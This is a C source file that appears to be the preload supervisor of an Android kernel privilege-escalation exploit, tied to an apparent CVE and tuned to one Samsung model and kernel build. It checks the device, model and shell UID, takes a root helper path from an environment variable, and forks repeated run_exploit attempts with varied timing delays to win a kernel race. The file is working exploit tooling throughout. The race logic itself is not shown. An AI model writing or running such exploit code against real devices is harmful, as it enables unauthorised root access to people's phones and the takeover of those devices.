#include "common.h"
#include <sys/utsname.h>
#include <sys/system_properties.h>

#define DEFAULT_EXPLOIT_ATTEMPTS 16
#define DEFAULT_PSELECT_DELAY_USEC 20000

static int env_int(const char *name, int fallback, int min, int max) {
  const char *value = getenv(name);
  if (!value || !*value) {
    return fallback;
  }

  char *end = NULL;
  errno = 0;
  long parsed = strtol(value, &end, 0);
  if (errno || end == value || *end || parsed < min || parsed > max) {
    return fallback;
  }
  return (int)parsed;
}

static int attempt_delay_usec(int base_delay, int attempt) {
  static const int offsets[] = {
    0, 10000, 30000, 5000, 20000, -5000, 40000, 15000,
  };
  int count = (int)(sizeof(offsets) / sizeof(offsets[0]));
  int delay = base_delay + offsets[(attempt - 1) % count];
  return delay < 0 ? 0 : delay;
}

__attribute__((constructor)) static void load(void) {
  static int started;
  if (started) {
    return;
  }
  started = 1;
  set_unbuffer();

  /* This experimental port deliberately supports only the verified stock
   * kernel and shell transport. Refuse before entering the kernel race. */
  struct utsname running;
  char model[PROP_VALUE_MAX] = {0};
  __system_property_get("ro.product.model", model);
  if (uname(&running) != 0 || strcmp(model, "SM-S908W") != 0 ||
      strcmp(running.release,
             "5.10.236-android12-9-31998796-abS908WVLSAGZE3") != 0) {
    pr_error("rmgnext: this payload requires SM-S908W S908WVLSAGZE3 exactly\n");
    _exit(64);
  }
  if (getuid() != 2000 || geteuid() != 2000) {
    pr_error("rmgnext: shell UID 2000 required; enable and authorize Shizuku\n");
    _exit(65);
  }
  const char *helper = getenv("CVE43499_ROOT_HELPER");
  if (!helper || helper[0] != '/' || strlen(helper) >= 256 ||
      access(helper, X_OK) != 0) {
    pr_error("rmgnext: Next bootstrap helper missing or not executable\n");
    _exit(66);
  }
  const char *route = getenv("SLIDE_SOURCE");
  if (route && strcmp(route, "tracefs") != 0 &&
      strcmp(route, "auto") != 0 && strcmp(route, "default") != 0) {
    pr_error("rmgnext: this port supports tracefs only; select tracefs route\n");
    _exit(67);
  }
  unsetenv("SLIDE_P0_OFFSET");
  pr_info("rmgnext: experimental S908WVLSAGZE3 shell port v1; helper=%s\n", helper);

  int max_attempts = env_int(
      "EXPLOIT_ATTEMPTS", DEFAULT_EXPLOIT_ATTEMPTS, 1, 64);
  if (max_attempts > 1) {
    pr_info("rmgnext: first-test build caps this run at one native attempt; reboot before another test\n");
    max_attempts = 1;
  }
  int base_delay = env_int(
      "PSELECT_DELAY_USEC", DEFAULT_PSELECT_DELAY_USEC, 0, 1000000);
  if (getenv("SLIDE_ONLY")) {
    max_attempts = 1;
  }

  unsetenv("LD_PRELOAD");
  char *argv[] = {"preload.so", NULL};

  pr_success("preload supervisor pid=%d attempts=%d base_delay=%d\n",
             getpid(), max_attempts, base_delay);

  for (int attempt = 1; attempt <= max_attempts; attempt++) {
    int delay_usec = attempt_delay_usec(base_delay, attempt);
    pid_t child = SYSCHK(fork());
    if (child == 0) {
      char delay[16];
      snprintf(delay, sizeof(delay), "%d", delay_usec);
      SYSCHK(setenv("PSELECT_DELAY_USEC", delay, 1));
      pr_success("exploit attempt=%d/%d pid=%d delay=%d\n",
                 attempt, max_attempts, getpid(), delay_usec);
      _exit(run_exploit(1, argv));
    }

    int status = 0;
    pid_t waited;
    do {
      waited = waitpid(child, &status, 0);
    } while (waited < 0 && errno == EINTR);
    if (waited < 0) {
      pr_error("waitpid attempt=%d pid=%d errno=%d\n",
               attempt, child, errno);
    }
    if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
      pr_success("exploit completed attempt=%d/%d\n", attempt, max_attempts);
      return;
    }

    if (WIFSIGNALED(status)) {
      pr_warning("exploit attempt=%d/%d terminated signal=%d\n",
                 attempt, max_attempts, WTERMSIG(status));
    } else {
      pr_warning("exploit attempt=%d/%d failed status=%d\n",
                 attempt, max_attempts,
                 WIFEXITED(status) ? WEXITSTATUS(status) : status);
    }
  }

  pr_error("exploit failed after %d independent attempts\n", max_attempts);
  _exit(1);
}
